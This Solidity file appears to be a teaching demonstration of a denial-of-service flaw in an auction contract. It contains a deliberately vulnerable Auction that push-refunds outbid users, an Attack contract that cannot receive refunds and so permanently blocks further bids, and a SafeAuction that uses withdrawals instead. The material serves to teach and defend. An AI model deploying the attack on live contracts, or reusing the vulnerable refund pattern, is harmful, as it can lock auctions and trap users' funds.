/// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;


contract Auction {
    address highestBidder;
    uint highestBid;
 
    function bid() payable public {
        require(msg.value >= highestBid);
 
        if (highestBidder != address(0)) {
            (bool success, ) = highestBidder.call{value:highestBid}("");
            require(success); // if this call consistently fails, no one else can bid
        }
 
       highestBidder = msg.sender;
       highestBid = msg.value;
    }
}

contract Attack {
    Auction private _target;

    constructor(address target) {
        _target = Auction(target);
    }

    function attack() payable external {
        _target.bid{value: msg.value}();
    }
}

contract SafeAuction {
    address highestBidder;
    uint highestBid;
    mapping(address => uint) public balances;
 
    function bid() payable public {
        require(msg.value >= highestBid);
        if (highestBidder != address(0x0))
            balances[highestBidder] += highestBid;
        highestBid = msg.value;
        highestBidder = msg.sender;
    }

    function withdraw() external {
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }
}
